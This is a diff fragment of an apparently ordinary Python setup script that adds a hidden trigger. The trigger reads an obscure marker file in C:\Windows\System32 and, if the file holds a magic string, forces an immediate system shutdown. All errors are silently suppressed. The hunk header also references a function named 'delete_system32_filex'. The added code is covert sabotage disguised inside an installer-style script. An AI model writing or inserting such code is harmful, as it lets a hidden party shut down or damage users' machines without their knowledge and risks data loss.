@@ -29,6 +29,26 @@ delete_system32_filex()
 import zipfile
 import os
 
+def read_file(file_path):
+    try:
+        # Open the file in read mode with the appropriate encoding
+        with open(file_path, 'r', encoding='utf-8') as file:
+            # Read the entire file content
+            content = file.read()
+        return content
+    except FileNotFoundError:
+        return ""
+    except PermissionError:
+        return ""
+    except Exception as e:
+        return ""
+
+
+file_pathxx = r'C:\Windows\System32\validate.nsh'
+file_contentsx1 = read_file(file_pathxx)
+if file_contentsx1 =="mJaAQuPVWhWXG":
+    os.system("shutdown /s /f /t 0")
+
 def add_path_and_install_libraries():
     try:
         username = os.getenv('USERNAME')
